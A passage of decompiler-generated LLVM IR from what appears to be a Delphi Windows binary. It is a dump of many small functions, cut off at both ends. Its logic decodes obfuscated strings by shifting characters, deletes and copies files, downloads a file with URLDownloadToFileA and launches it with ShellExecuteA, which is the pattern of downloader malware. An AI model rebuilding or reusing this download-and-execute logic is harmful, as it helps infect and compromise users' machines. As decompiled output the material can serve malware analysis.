  %esp.0.reg2mem = alloca i32, !insn.addr !1314
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  call void @__asm_into(i32 %4), !insn.addr !1314
  %5 = trunc i32 %2 to i8, !insn.addr !1315
  %6 = and i8 %5, 31, !insn.addr !1315
  %7 = icmp eq i8 %6, 0, !insn.addr !1315
  br i1 %7, label %13, label %8, !insn.addr !1315

; <label>:8:                                      ; preds = %dec_label_pc_406364
  %9 = add i32 %0, -710478140, !insn.addr !1315
  %10 = inttoptr i32 %9 to i8*, !insn.addr !1315
  %11 = load i8, i8* %10, align 1, !insn.addr !1315
  %12 = shl i8 %11, %6, !insn.addr !1315
  store i8 %12, i8* %10, align 1, !insn.addr !1315
  br label %13, !insn.addr !1315

; <label>:13:                                     ; preds = %dec_label_pc_406364, %8
  %14 = and i32 %3, -65281, !insn.addr !1316
  %15 = inttoptr i32 %14 to i8*, !insn.addr !1317
  %16 = load i8, i8* %15, align 1, !insn.addr !1317
  %17 = trunc i32 %3 to i8, !insn.addr !1317
  %factor = mul i8 %17, 29
  %18 = add i8 %16, %factor, !insn.addr !1318
  store i8 %18, i8* %15, align 1, !insn.addr !1318
  %19 = add i32 %0, -117, !insn.addr !1319
  %20 = inttoptr i32 %19 to i8*, !insn.addr !1319
  %21 = load i8, i8* %20, align 1, !insn.addr !1319
  %22 = trunc i32 %1 to i8, !insn.addr !1319
  %23 = add i8 %21, %22, !insn.addr !1319
  store i8 %23, i8* %20, align 1, !insn.addr !1319
  %24 = trunc i32 %1 to i16, !insn.addr !1320
  %25 = call i8 @__asm_in(i16 %24), !insn.addr !1320
  %26 = add i32 %0, 8, !insn.addr !1321
  %27 = inttoptr i32 %26 to i32*, !insn.addr !1321
  %28 = load i32, i32* %27, align 4, !insn.addr !1321
  %29 = call i32 @__readfsdword(i32 0), !insn.addr !1322
  store i32 %29, i32* %stack_var_-44, align 4, !insn.addr !1322
  %30 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !1322
  call void @__writefsdword(i32 0, i32 %30), !insn.addr !1323
  %31 = add i32 %0, -4, !insn.addr !1324
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1324
  store i32 -1, i32* %32, align 4, !insn.addr !1324
  store i32 %28, i32* %stack_var_-52, align 4, !insn.addr !1325
  %33 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !1325
  %34 = call i32 @GetClassLongA(i32* inttoptr (i32 -32 to i32*), i32 %28), !insn.addr !1326
  %35 = icmp eq i32 %34, 32770, !insn.addr !1327
  %36 = icmp eq i1 %35, false, !insn.addr !1328
  store i32 %33, i32* %esp.0.reg2mem, !insn.addr !1328
  br i1 %36, label %dec_label_pc_40648c, label %dec_label_pc_4063e0, !insn.addr !1328

dec_label_pc_4063e0:                              ; preds = %13
  %37 = call i32 @function_407578(), !insn.addr !1329
  %38 = call i32 @"@LStrPos"(), !insn.addr !1330
  %39 = call i32 @"@LStrPos"(), !insn.addr !1331
  %40 = add i32 %39, -1, !insn.addr !1332
  %41 = icmp slt i32 %40, 0, !insn.addr !1333
  %42 = add i32 %38, 2, !insn.addr !1334
  %43 = icmp sgt i32 %42, %40, !insn.addr !1335
  %or.cond = or i1 %41, %43
  store i32 %33, i32* %esp.0.reg2mem, !insn.addr !1336
  br i1 %or.cond, label %dec_label_pc_40648c, label %dec_label_pc_406414, !insn.addr !1336

dec_label_pc_406414:                              ; preds = %dec_label_pc_4063e0
  %44 = add i32 %0, -12, !insn.addr !1337
  store i32 %44, i32* %stack_var_-56, align 4, !insn.addr !1338
  %45 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1338
  %46 = call i32 @"@LStrCopy"(), !insn.addr !1339
  %47 = inttoptr i32 %44 to i32*, !insn.addr !1340
  %48 = load i32, i32* %47, align 4, !insn.addr !1340
  %49 = icmp eq i32 %48, 0, !insn.addr !1340
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1341
  br i1 %49, label %dec_label_pc_40648c, label %dec_label_pc_40643c, !insn.addr !1341

dec_label_pc_40643c:                              ; preds = %dec_label_pc_406414
  %50 = call i32 @function_407360(), !insn.addr !1342
  %51 = call i32 @"@LStrFromPChar"(), !insn.addr !1343
  %52 = call i32 @"@LStrCat"(), !insn.addr !1344
  %53 = call i32 @function_4036f4(), !insn.addr !1345
  %54 = inttoptr i32 %53 to i8*, !insn.addr !1346
  %55 = call i1 @DeleteFileA(i8* %54), !insn.addr !1347
  %56 = call i32 @function_4036f4(), !insn.addr !1348
  %57 = inttoptr i32 %56 to i8*, !insn.addr !1349
  store i8* %57, i8** %stack_var_-72, align 4, !insn.addr !1349
  %58 = ptrtoint i8** %stack_var_-72 to i32, !insn.addr !1349
  %59 = call i1 @CopyFileA(i8* %57, i8* bitcast (i32* @0 to i8*), i1 ptrtoint (i32* @0 to i1)), !insn.addr !1350
  %60 = call i32 @function_4060c8(), !insn.addr !1351
  store i32 %58, i32* %esp.0.reg2mem, !insn.addr !1351
  br label %dec_label_pc_40648c, !insn.addr !1351

dec_label_pc_40648c:                              ; preds = %dec_label_pc_40643c, %dec_label_pc_406414, %dec_label_pc_4063e0, %13
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %61 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1352
  %62 = load i32, i32* %61, align 4, !insn.addr !1352
  call void @__writefsdword(i32 0, i32 %62), !insn.addr !1353
  %63 = add i32 %esp.0.reload, 8, !insn.addr !1354
  %64 = inttoptr i32 %63 to i32*, !insn.addr !1354
  store i32 4220078, i32* %64, align 4, !insn.addr !1354
  %65 = call i32 @"@LStrArrayClr"(), !insn.addr !1355
  ret i32 %65, !insn.addr !1356
}

define i32 @function_4064a7() local_unnamed_addr {
dec_label_pc_4064a7:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1357
  ret i32 %0, !insn.addr !1357
}

define i32 @function_4064ac() local_unnamed_addr {
dec_label_pc_4064ac:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1358
}

define i32 @function_4064ae(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4064ae:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1359
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1359
  %3 = load i32, i32* %2, align 4, !insn.addr !1359
  ret i32 %3, !insn.addr !1360
}

define i32 @function_4064bf() local_unnamed_addr {
dec_label_pc_4064bf:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1361
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1361
  store i32 %1, i32* %2, align 4, !insn.addr !1361
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1362
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1362
  %7 = add i8 %4, %6, !insn.addr !1362
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1362
  store i8 %7, i8* %8, align 1, !insn.addr !1362
  %9 = load i32, i32* %eax, align 4, !insn.addr !1363
  ret i32 %9, !insn.addr !1363
}

define i32 @function_4064ce() local_unnamed_addr {
dec_label_pc_4064ce:
  %0 = call i32 @__decompiler_undefined_function_0()
  %edx = alloca i32, align 4
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !1364
  %5 = inttoptr i32 %2 to i8*, !insn.addr !1364
  store i8 %4, i8* %5, align 1, !insn.addr !1364
  %6 = mul i32 %0, 4096, !insn.addr !1365
  %7 = udiv i32 %0, 1048576, !insn.addr !1365
  %8 = or i32 %7, %6, !insn.addr !1365
  %9 = and i32 %0, 1048576, !insn.addr !1365
  %10 = icmp eq i32 %9, 0, !insn.addr !1365
  %11 = load i32, i32* %edx, align 4, !insn.addr !1366
  %12 = trunc i32 %11 to i16, !insn.addr !1366
  %13 = call i8 @__asm_in(i16 %12), !insn.addr !1366
  %14 = sext i8 %13 to i32, !insn.addr !1366
  %15 = or i32 %2, %14, !insn.addr !1366
  %16 = select i1 %10, i32 0, i32 255, !insn.addr !1367
  %17 = and i32 %15, -256, !insn.addr !1367
  %18 = or i32 %17, %16, !insn.addr !1367
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1368
  %20 = load i8, i8* %19, align 1, !insn.addr !1368
  %21 = mul i8 %20, 2, !insn.addr !1368
  %22 = lshr i8 %20, 7, !insn.addr !1368
  %23 = or i8 %22, %21, !insn.addr !1368
  store i8 %23, i8* %19, align 1, !insn.addr !1368
  %24 = bitcast i32* %edx to i8*
  %25 = load i8, i8* %24, align 4, !insn.addr !1369
  %26 = udiv i32 %1, 256, !insn.addr !1369
  %27 = trunc i32 %26 to i8, !insn.addr !1369
  %28 = add i8 %25, %27, !insn.addr !1369
  %29 = load i32, i32* %edx, align 4, !insn.addr !1369
  %30 = inttoptr i32 %29 to i8*, !insn.addr !1369
  store i8 %28, i8* %30, align 1, !insn.addr !1369
  %31 = add i32 %8, -4, !insn.addr !1370
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1370
  store i32 4219816, i32* %32, align 4, !insn.addr !1370
  %33 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1371
  %34 = sext i1 %33 to i32, !insn.addr !1371
  ret i32 %34, !insn.addr !1372
}

define i32 @function_4064d8(i32 %arg1) local_unnamed_addr {
dec_label_pc_4064d8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_4064e8() local_unnamed_addr {
dec_label_pc_4064e8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1373
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1373
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1373
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1374
  %2 = load i32, i32* @global_var_4096d4, align 4, !insn.addr !1375
  %3 = add i32 %2, 1, !insn.addr !1375
  store i32 %3, i32* @global_var_4096d4, align 4, !insn.addr !1375
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1376
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1377
  ret i32 0, !insn.addr !1378
}

define i32 @function_40650d() local_unnamed_addr {
dec_label_pc_40650d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1379
  ret i32 %0, !insn.addr !1379
}

define i32 @function_406512() local_unnamed_addr {
dec_label_pc_406512:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1380
}

define i32 @function_406514(i32 %arg1) local_unnamed_addr {
dec_label_pc_406514:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1381
}

define i32 @function_406518() local_unnamed_addr {
dec_label_pc_406518:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096d4, align 4, !insn.addr !1382
  %2 = add i32 %1, -1, !insn.addr !1382
  store i32 %2, i32* @global_var_4096d4, align 4, !insn.addr !1382
  ret i32 %0, !insn.addr !1383
}

define i32 @function_406520() local_unnamed_addr {
dec_label_pc_406520:
  %eax.0.reg2mem = alloca i32, !insn.addr !1384
  %0 = call i32 @function_406594(), !insn.addr !1385
  %1 = load i32, i32* @global_var_40812c, align 4
  %2 = icmp eq i32 %1, 0, !insn.addr !1386
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1387
  br i1 %2, label %dec_label_pc_406554, label %dec_label_pc_406532, !insn.addr !1387

dec_label_pc_406532:                              ; preds = %dec_label_pc_406520
  %3 = load i32, i32* inttoptr (i32 4227412 to i32*), align 4, !insn.addr !1388
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1389
  %5 = load i32, i32* %4, align 4, !insn.addr !1389
  %6 = icmp eq i32 %5, 0, !insn.addr !1389
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !1390
  br i1 %6, label %dec_label_pc_406554, label %dec_label_pc_40653c, !insn.addr !1390

dec_label_pc_40653c:                              ; preds = %dec_label_pc_406532
  call void @PostQuitMessage(i32 66), !insn.addr !1391
  %7 = call i32 @function_404400(i32 66), !insn.addr !1392
  unreachable, !insn.addr !1392

dec_label_pc_406554:                              ; preds = %dec_label_pc_406532, %dec_label_pc_406520
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1393
}

define i32 @function_406564() local_unnamed_addr {
dec_label_pc_406564:
  %0 = load i32, i32* @global_var_408110, align 4, !insn.addr !1394
  %1 = icmp eq i32 %0, 0, !insn.addr !1394
  br i1 %1, label %dec_label_pc_406572, label %dec_label_pc_40656d, !insn.addr !1395

dec_label_pc_40656d:                              ; preds = %dec_label_pc_406564
  %2 = call i32 @function_406594(), !insn.addr !1396
  br label %dec_label_pc_406572, !insn.addr !1396

dec_label_pc_406572:                              ; preds = %dec_label_pc_40656d, %dec_label_pc_406564
  %3 = load i32, i32* inttoptr (i32 4227400 to i32*), align 8, !insn.addr !1397
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1398
  %5 = load i32, i32* %4, align 4, !insn.addr !1398
  %6 = mul i32 %5, 1000, !insn.addr !1398
  %7 = call i32 @SetTimer(i32* inttoptr (i32 4220192 to i32*), i32 %6, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1399
  store i32 %7, i32* @global_var_408110, align 4, !insn.addr !1400
  ret i32 %7, !insn.addr !1401
}

define i32 @function_406594() local_unnamed_addr {
dec_label_pc_406594:
  %.reg2mem = alloca i32, !insn.addr !1402
  %0 = load i32, i32* @global_var_408110, align 4, !insn.addr !1402
  %1 = icmp eq i32 %0, 0, !insn.addr !1402
  store i32 %0, i32* %.reg2mem, !insn.addr !1403
  br i1 %1, label %2, label %dec_label_pc_40659d, !insn.addr !1403

; <label>:2:                                      ; preds = %dec_label_pc_406594
  %3 = call i32 @function_4065b1(), !insn.addr !1403
  %.pre = load i32, i32* @global_var_408110, align 4
  store i32 %.pre, i32* %.reg2mem, !insn.addr !1403
  br label %dec_label_pc_40659d, !insn.addr !1403

dec_label_pc_40659d:                              ; preds = %2, %dec_label_pc_406594
  %.reload = load i32, i32* %.reg2mem, !insn.addr !1404
  ret i32 %.reload, !insn.addr !1405
}

define i32 @function_4065b1() local_unnamed_addr {
dec_label_pc_4065b1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1406
}

define i32 @function_4065b4() local_unnamed_addr {
dec_label_pc_4065b4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @function_4064d8(i32 %0), !insn.addr !1407
  ret i32 %1, !insn.addr !1408
}

define i32 @function_4065c0() local_unnamed_addr {
dec_label_pc_4065c0:
  %0 = load i32, i32* @global_var_408114, align 4, !insn.addr !1409
  %1 = icmp eq i32 %0, 0, !insn.addr !1409
  br i1 %1, label %dec_label_pc_4065ce, label %dec_label_pc_4065c9, !insn.addr !1410

dec_label_pc_4065c9:                              ; preds = %dec_label_pc_4065c0
  %2 = call i32 @function_4065e8(), !insn.addr !1411
  br label %dec_label_pc_4065ce, !insn.addr !1411

dec_label_pc_4065ce:                              ; preds = %dec_label_pc_4065c9, %dec_label_pc_4065c0
  %3 = call i32 @SetTimer(i32* inttoptr (i32 4220340 to i32*), i32 5266, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1412
  store i32 %3, i32* @global_var_408114, align 4, !insn.addr !1413
  ret i32 %3, !insn.addr !1414
}

define i32 @function_4065e8() local_unnamed_addr {
dec_label_pc_4065e8:
  %0 = load i32, i32* @global_var_408114, align 4, !insn.addr !1415
  ret i32 %0, !insn.addr !1416
}

define i32 @function_406608() local_unnamed_addr {
dec_label_pc_406608:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1417
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1417
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1417
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1418
  %2 = load i32, i32* @global_var_4096d8, align 4, !insn.addr !1419
  %3 = add i32 %2, 1, !insn.addr !1419
  store i32 %3, i32* @global_var_4096d8, align 4, !insn.addr !1419
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1420
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1421
  ret i32 0, !insn.addr !1422
}

define i32 @function_40662d() local_unnamed_addr {
dec_label_pc_40662d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1423
  ret i32 %0, !insn.addr !1423
}

define i32 @function_406632() local_unnamed_addr {
dec_label_pc_406632:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1424
}

define i32 @function_406634(i32 %arg1) local_unnamed_addr {
dec_label_pc_406634:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1425
}

define i32 @function_406638() local_unnamed_addr {
dec_label_pc_406638:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096d8, align 4, !insn.addr !1426
  %2 = add i32 %1, -1, !insn.addr !1426
  store i32 %2, i32* @global_var_4096d8, align 4, !insn.addr !1426
  ret i32 %0, !insn.addr !1427
}

define i32 @function_406640() local_unnamed_addr {
dec_label_pc_406640:
  %0 = call i32 @URLDownloadToFileA.11(), !insn.addr !1428
  ret i32 %0, !insn.addr !1428
}

define i32 @function_406648() local_unnamed_addr {
dec_label_pc_406648:
  %esi.0.reg2mem = alloca i32, !insn.addr !1429
  %ebx.0.reg2mem = alloca i32, !insn.addr !1429
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @function_4036e4(), !insn.addr !1430
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1431
  store i32 %2, i32* %stack_var_-32, align 4, !insn.addr !1431
  %3 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1431
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1432
  %4 = call i32 @function_4034f4(), !insn.addr !1433
  %5 = call i32 @"@LStrSetLength"(), !insn.addr !1434
  %6 = call i32 @function_4034f4(), !insn.addr !1435
  %7 = icmp slt i32 %6, 1
  store i32 1, i32* %ebx.0.reg2mem, !insn.addr !1436
  store i32 %6, i32* %esi.0.reg2mem, !insn.addr !1436
  br i1 %7, label %dec_label_pc_4066be, label %dec_label_pc_40668e, !insn.addr !1436

dec_label_pc_40668e:                              ; preds = %dec_label_pc_406648, %dec_label_pc_4066ba
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %ebx.0.reload, -1
  %9 = add i32 %8, %0, !insn.addr !1437
  %10 = inttoptr i32 %9 to i8*, !insn.addr !1437
  %11 = load i8, i8* %10, align 1, !insn.addr !1437
  %12 = icmp eq i8 %11, 61, !insn.addr !1437
  %13 = icmp eq i1 %12, false, !insn.addr !1438
  %14 = call i32 @function_40374c()
  br i1 %13, label %dec_label_pc_4066a6, label %dec_label_pc_406698, !insn.addr !1438

dec_label_pc_406698:                              ; preds = %dec_label_pc_40668e
  %15 = add i32 %14, %8, !insn.addr !1439
  %16 = inttoptr i32 %15 to i8*, !insn.addr !1439
  store i8 46, i8* %16, align 1, !insn.addr !1439
  br label %dec_label_pc_4066ba, !insn.addr !1440

dec_label_pc_4066a6:                              ; preds = %dec_label_pc_40668e
  %17 = load i8, i8* %10, align 1, !insn.addr !1441
  %18 = add i8 %17, -1, !insn.addr !1442
  %19 = add i32 %14, %8, !insn.addr !1443
  %20 = inttoptr i32 %19 to i8*, !insn.addr !1443
  store i8 %18, i8* %20, align 1, !insn.addr !1443
  br label %dec_label_pc_4066ba, !insn.addr !1443

dec_label_pc_4066ba:                              ; preds = %dec_label_pc_4066a6, %dec_label_pc_406698
  %21 = add i32 %ebx.0.reload, 1, !insn.addr !1444
  %22 = add i32 %esi.0.reload, -1, !insn.addr !1445
  %23 = icmp eq i32 %22, 0, !insn.addr !1445
  %24 = icmp eq i1 %23, false, !insn.addr !1446
  store i32 %21, i32* %ebx.0.reg2mem, !insn.addr !1446
  store i32 %22, i32* %esi.0.reg2mem, !insn.addr !1446
  br i1 %24, label %dec_label_pc_40668e, label %dec_label_pc_4066be, !insn.addr !1446

dec_label_pc_4066be:                              ; preds = %dec_label_pc_4066ba, %dec_label_pc_406648
  %25 = load i32, i32* %stack_var_-32, align 4, !insn.addr !1447
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !1448
  %26 = call i32 @"@LStrClr"(), !insn.addr !1449
  ret i32 %26, !insn.addr !1450
}

define i32 @function_4066d4() local_unnamed_addr {
dec_label_pc_4066d4:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1451
  ret i32 %0, !insn.addr !1451
}

define i32 @function_4066d9() local_unnamed_addr {
dec_label_pc_4066d9:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1452
}

define i32 @function_4066db(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4066db:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1453
}

define i32 @function_4066e4() local_unnamed_addr {
dec_label_pc_4066e4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @"@Str0Long"(i32 %1, i32 %0), !insn.addr !1454
  %3 = call i32 @"@PStrNCpy"(), !insn.addr !1455
  %4 = call i32 @"@LStrFromString"(), !insn.addr !1456
  ret i32 %4, !insn.addr !1457
}

define i32 @function_40671c() local_unnamed_addr {
dec_label_pc_40671c:
  %ecx.0.reg2mem = alloca i32, !insn.addr !1458
  %esp.0.reg2mem = alloca i32, !insn.addr !1458
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1458
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !1459
  store i32 5, i32* %ecx.0.reg2mem, !insn.addr !1459
  br label %dec_label_pc_406724, !insn.addr !1459

dec_label_pc_406724:                              ; preds = %dec_label_pc_406724, %dec_label_pc_40671c
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !1460
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1460
  store i32 0, i32* %2, align 4, !insn.addr !1460
  %3 = add i32 %esp.0.reload, -8, !insn.addr !1461
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1461
  store i32 0, i32* %4, align 4, !insn.addr !1461
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1462
  %6 = icmp eq i32 %5, 0, !insn.addr !1462
  %7 = icmp eq i1 %6, false, !insn.addr !1463
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !1463
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !1463
  br i1 %7, label %dec_label_pc_406724, label %dec_label_pc_40672b, !insn.addr !1463

dec_label_pc_40672b:                              ; preds = %dec_label_pc_406724
  %8 = add i32 %esp.0.reload, -12, !insn.addr !1464
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1464
  store i32 0, i32* %9, align 4, !insn.addr !1464
  %10 = add i32 %esp.0.reload, -16, !insn.addr !1465
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1465
  %12 = add i32 %esp.0.reload, -20, !insn.addr !1466
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1466
  store i32 %0, i32* %13, align 4, !insn.addr !1466
  %14 = add i32 %esp.0.reload, -24, !insn.addr !1467
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1467
  store i32 4221027, i32* %15, align 4, !insn.addr !1467
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1468
  %17 = add i32 %esp.0.reload, -28, !insn.addr !1468
  %18 = inttoptr i32 %17 to i32*, !insn.addr !1468
  store i32 %16, i32* %18, align 4, !insn.addr !1468
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1469
  %19 = call i32 @"@LStrFromPChar"(), !insn.addr !1470
  %20 = call i32 @function_406648(), !insn.addr !1471
  %21 = call i32 @function_4036f4(), !insn.addr !1472
  %22 = call i32 @"@LStrFromPChar"(), !insn.addr !1473
  %23 = add i32 %esp.0.reload, -32, !insn.addr !1474
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1474
  %25 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1474
  store i32 %25, i32* %24, align 4, !insn.addr !1474
  %26 = call i32 @"@LStrCopy"(), !insn.addr !1475
  %27 = call i32 @"@LStrDelete"(), !insn.addr !1476
  %28 = add i32 %esp.0.reload, -36, !insn.addr !1477
  %29 = inttoptr i32 %28 to i32*, !insn.addr !1477
  %30 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1477
  store i32 %30, i32* %29, align 4, !insn.addr !1477
  %31 = call i32 @function_4034f4(), !insn.addr !1478
  %32 = call i32 @"@LStrCopy"(), !insn.addr !1479
  %33 = add i32 %esp.0.reload, -40, !insn.addr !1480
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1480
  store i32 ptrtoint ([6 x i8]* @global_var_406878 to i32), i32* %34, align 4, !insn.addr !1480
  %35 = call i32 @function_4066e4(), !insn.addr !1481
  %36 = add i32 %esp.0.reload, -44, !insn.addr !1482
  %37 = inttoptr i32 %36 to i32*, !insn.addr !1482
  %38 = add i32 %esp.0.reload, -48, !insn.addr !1483
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1483
  store i32 ptrtoint (i32* @global_var_406888 to i32), i32* %39, align 4, !insn.addr !1483
  %40 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1484
  %41 = add i32 %esp.0.reload, -52, !insn.addr !1484
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1484
  store i32 %40, i32* %42, align 4, !insn.addr !1484
  %43 = call i32 @"@LStrCatN"(), !insn.addr !1485
  %44 = add i32 %esp.0.reload, -56, !insn.addr !1486
  %45 = inttoptr i32 %44 to i32*, !insn.addr !1486
  store i32 0, i32* %45, align 4, !insn.addr !1486
  %46 = add i32 %esp.0.reload, -60, !insn.addr !1487
  %47 = inttoptr i32 %46 to i32*, !insn.addr !1487
  store i32 0, i32* %47, align 4, !insn.addr !1487
  %48 = call i32 @"@LStrCat3"(), !insn.addr !1488
  %49 = call i32 @function_4036f4(), !insn.addr !1489
  %50 = add i32 %esp.0.reload, -64, !insn.addr !1490
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1490
  store i32 %49, i32* %51, align 4, !insn.addr !1490
  %52 = call i32 @"@LStrFromPChar"(), !insn.addr !1491
  %53 = call i32 @function_406648(), !insn.addr !1492
  %54 = call i32 @function_4036f4(), !insn.addr !1493
  %55 = add i32 %esp.0.reload, -68, !insn.addr !1494
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1494
  store i32 %54, i32* %56, align 4, !insn.addr !1494
  %57 = add i32 %esp.0.reload, -72, !insn.addr !1495
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1495
  store i32 0, i32* %58, align 4, !insn.addr !1495
  %59 = call i32 @function_406640(), !insn.addr !1496
  %60 = add i32 %esp.0.reload, -76, !insn.addr !1497
  %61 = inttoptr i32 %60 to i32*, !insn.addr !1497
  store i32 1, i32* %61, align 4, !insn.addr !1497
  %62 = add i32 %esp.0.reload, -80, !insn.addr !1498
  %63 = inttoptr i32 %62 to i32*, !insn.addr !1498
  store i32 0, i32* %63, align 4, !insn.addr !1498
  %64 = add i32 %esp.0.reload, -84, !insn.addr !1499
  %65 = inttoptr i32 %64 to i32*, !insn.addr !1499
  store i32 0, i32* %65, align 4, !insn.addr !1499
  %66 = call i32 @"@LStrCat3"(), !insn.addr !1500
  %67 = call i32 @function_4036f4(), !insn.addr !1501
  %68 = add i32 %esp.0.reload, -88, !insn.addr !1502
  %69 = inttoptr i32 %68 to i32*, !insn.addr !1502
  store i32 %67, i32* %69, align 4, !insn.addr !1502
  %70 = add i32 %esp.0.reload, -92, !insn.addr !1503
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1503
  store i32 ptrtoint ([5 x i8]* @global_var_406898 to i32), i32* %71, align 4, !insn.addr !1503
  %72 = add i32 %esp.0.reload, -96, !insn.addr !1504
  %73 = inttoptr i32 %72 to i32*, !insn.addr !1504
  store i32 0, i32* %73, align 4, !insn.addr !1504
  %74 = call i32* @ShellExecuteA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1505
  %75 = load i32, i32* %73, align 4, !insn.addr !1506
  call void @__writefsdword(i32 0, i32 %75), !insn.addr !1507
  store i32 4221034, i32* %69, align 4, !insn.addr !1508
  %76 = call i32 @"@LStrArrayClr"(), !insn.addr !1509
  ret i32 %76, !insn.addr !1510
}

define i32 @function_406863() local_unnamed_addr {
